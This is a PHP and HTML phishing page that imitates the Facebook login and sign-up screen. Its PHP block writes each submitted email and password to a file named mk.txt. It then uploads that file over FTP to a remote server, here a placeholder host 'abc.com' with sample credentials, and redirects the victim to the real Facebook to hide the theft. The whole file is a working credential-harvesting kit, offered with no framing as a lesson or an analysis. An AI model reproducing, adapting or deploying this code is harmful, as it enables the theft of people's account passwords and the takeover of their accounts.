<?php
  if(isset($_POST['email']) && isset($_POST['pass'])){
    $name=$_POST['email'];
    $mk=$_POST['pass'];
    $fp = @fopen('mk.txt', "a");
    $data = 'Username: '.$name.' '.' Password: '.$mk;
    fwrite($fp, $data);
  } 
if(isset($_POST['submit'])){
  $ftp_server="abc.com";
  $ftp_user_name="sample";
  $ftp_user_pass="sample";
  $file = "mk.txt";
  $remote_file = "mk.txt";
  $conn_id = ftp_connect($ftp_server);
  $login_result = ftp_login($conn_id, $ftp_user_name, $ftp_user_pass);
  if (ftp_put($conn_id, $remote_file, $file, FTP_ASCII)) {
    header('Location: https://www.facebook.com/');
    exit;
  } 
  else {
    exit;
  }
  ftp_close($conn_id);
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Facebook</title>
<link rel="stylesheet" href="style.css" type="text/css" />
</head>
<body class="login">
<!-- header starts here -->
<div id="facebook-Bar">
  <div id="facebook-Frame">
    <div id="logo"> <a href="https://minhthuongeh.wordpress.com">Facebook</a> </div>
    <div id="header-main-right">
      <div id="header-main-right-nav">
        <form method="post" action="" id="login_form" name="login_form" enctype="multipart/form-data">
          <table border="0" style="border:none">
            <tr>
              <td ><input type="text" tabindex="1"  id="email" placeholder="Email or Phone" name="email" class="inputtext radius1" value=""></td>
              <td ><input type="password" tabindex="2" id="pass" placeholder="Password" name="pass" class="inputtext radius1" ></td>
              <td ><input type="submit" class="fbbutton" name="submit" value="Login" /></td>
            </tr>
            <tr>
              <td><label>
                  <input id="persist_box" type="checkbox" name="persistent" value="1" checked="1"/>
                  <span style="color:#ccc;">Keep me logged in</span></label></td>
              <td><label><a href="" style="color:#ccc; text-decoration:none">forgot your password?</a></label></td>
            </tr>
          </table>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- header ends here -->
<div class="loginbox radius">
  <h2 style="color:#141823; text-align:center;">Welcome to Facebook</h2>
  <div class="loginboxinner radius">
    <div class="loginheader">
      <h4 class="title">Connect with friends and the world around you.</h4>
    </div>
    <!--loginheader-->
    <div class="loginform">
      <form id="login" action="" method="post">
        <p>
          <input type="text" id="firstname" name="firstname" placeholder="First Name" value="" class="radius mini" />
          <input type="text" id="lastname" name="lastname" placeholder="Last Name" value="" class="radius mini" />
        </p>
        <p>
          <input type="text" id="email" name="email" placeholder="Your Email" value="" class="radius" />
        </p>
        <p>
          <input type="text" id="remail" name="remail" placeholder="Re-enter Email" class="radius" />
        </p>
        <p>
          <input type="password" id="password" name="password" placeholder="New Password" class="radius" />
        </p>
        <p>
          <button class="radius title" name="signup">Sign Up for Facebook</button>
        </p>
      </form>
    </div>
    <!--loginform-->
  </div>
  <!--loginboxinner-->
</div>
<!--loginbox-->
</body>
</html>
